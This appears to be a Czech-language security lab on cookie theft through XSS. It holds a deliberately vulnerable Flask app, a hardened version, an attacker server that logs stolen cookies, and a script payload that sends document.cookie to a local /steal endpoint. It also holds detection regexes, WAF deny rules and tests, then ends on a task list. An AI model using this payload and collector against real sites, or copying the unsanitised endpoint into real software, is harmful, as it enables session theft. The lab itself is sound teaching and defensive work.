python
Kopírovat
from flask import Flask, request, make_response
app = Flask(__name__)
@app.route('/')
def index():
# Zranitelné: Cookie nemá HttpOnly flag
resp = make_response("<h1>Vulnerable App</h1><p>Cookie set!</p>")
resp.set_cookie('session_id', 'SECRET_SESSION_123', httponly=False)
return resp
@app.route('/comment', methods=['POST'])
def comment():
# Zranitelné: Žádná sanitizace vstupu (XSS Point)
user_input = request.form.get('text')
return f"<div>User said: {user_input}</div>"
if __name__ == '__main__':
app.run(port=8080)
target/secure_app.py
python
Kopírovat
from flask import Flask, request, session, make_response, jsonify
from flask_talisman import Talisman
import secrets
app = Flask(__name__)
app.config.update(
SECRET_KEY=secrets.token_hex(32),
SESSION_COOKIE_HTTPONLY=True,
SESSION_COOKIE_SECURE=False, # True v produkci s HTTPS
SESSION_COOKIE_SAMESITE='Strict'
)
# CSP: Zakazuje inline skripty a omezuje zdroje
csp = {'default-src': "'self'"}
Talisman(app, content_security_policy=csp)
@app.route('/')
def index():
session['user'] = 'admin'
return jsonify({"status": "Secure session created"})
@app.route('/api/data', methods=['POST'])
def data():
return jsonify({"data": "Sensitive content protected by CSP and HttpOnly"})
if __name__ == '__main__':
app.run(port=5000)
exploit/exploit.py
python
Kopírovat
from flask import Flask, request
import json
app = Flask(__name__)
# Server útočníka pro sběr dat
@app.route('/steal', methods=['POST'])
def steal():
data = request.json
with open('stolen_cookies.txt', 'a') as f:
f.write(f"IP: {request.remote_addr} | Cookies: {data.get('cookies')}\n")
print(f"[*] Stolen data received: {data}")
return "OK", 200
# Payload pro vložení do webu:
# <script>fetch('http://127.0.0.1:4444/steal', {method:'POST', mode:'no-cors', body:JSON.stringify({cookies:document.cookie})})</script>
if __name__ == '__main__':
print("[!] Attacker server running on port 4444...")
app.run(port=4444)
defense/detect.py
python
Kopírovat
import logging
import re
logging.basicConfig(filename='security.log', level=logging.WARNING)
def analyze_log_line(line):
# Detekce pokusu o přístup k document.cookie v URL nebo POST datech
patterns = [r"document\.cookie", r"<script>", r"fetch\(.*steal"]
for pattern in patterns:
if re.search(pattern, line, re.IGNORECASE):
logging.warning(f"🚨 ALERT: Suspicious activity detected: {line.strip()}")
return True
return False
# Simulace monitoringu
test_log = "127.0.0.1 - - [04/Mar/2026] \"POST /comment HTTP/1.1\" 200 - \"<script>document.cookie</script>\""
analyze_log_line(test_log)
defense/waf_rules.txt
text
Kopírovat
# ModSecurity / Generic WAF Rules
SecRule REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_FILENAME|ARGS "@rx <script" \
"id:10001,phase:2,deny,status:403,log,msg:'XSS Injection Attempt'"
SecRule ARGS "@rx document\.cookie" \
"id:10002,phase:2,deny,status:403,log,msg:'Cookie Theft Attempt'"
SecRule REQUEST_HEADERS:User-Agent "@rx (python-requests|curl|wget|selenium)" \
"id:10003,phase:1,deny,status:403,log,msg:'Automated Tool Blocked'"
tests/test_security.py
python
Kopírovat
import unittest
import requests
class SecurityTest(unittest.TestCase):
def test_http_only_flag(self):
# Testuje, zda je cookie v bezpečné aplikaci nepřístupná
r = requests.get('http://127.0.0.1:5000/')
cookie = r.cookies.get('session')
# V Pythonu cookie uvidíme, ale testujeme hlavičky
self.assertIn('HttpOnly', r.headers.get('Set-Cookie', ''))
def test_csp_headers(self):
# Testuje přítomnost CSP
r = requests.get('http://127.0.0.1:5000/')
self.assertIn('Content-Security-Policy', r.headers)
if __name__ == '__main__':
unittest.main()
6. 💡 Doporučení
P0 (Ihned): Povolit HttpOnly a Secure u všech autentizačních cookies.
P1 (Vysoká): Nasadit striktní Content-Security-Policy pro zamezení exfiltrace dat.
P2 (Střední): Implementovat Session Fingerprinting pro detekci krádeže aktivních relací.
P3 (Nízká): Pravidelné skenování závislostí (NPM/Pip) na přítomnost škodlivého kódu.

## TVOJE ÚKOLY:
1. Vytvoř zranitelnou aplikaci (Target) — jednoduchý server na localhost
2. Vytvoř útočný skript (Exploit) — funkční PoC
3. Vytvoř obranné mechanismy (Defense) — opravená verze + detekce
4. Vytvoř automatické testy, které:
   a) Spustí zranitelnou aplikaci
   b) Spustí exploit — ověří že útok funguje
   c) Spustí opravenou aplikaci
   d) Spustí exploit znovu — ověří že obrana funguje
5. Všechno musí běžet na localhost (127.0.0.1) v Termux

## FORMÁT ODPOVĚDI (JSON):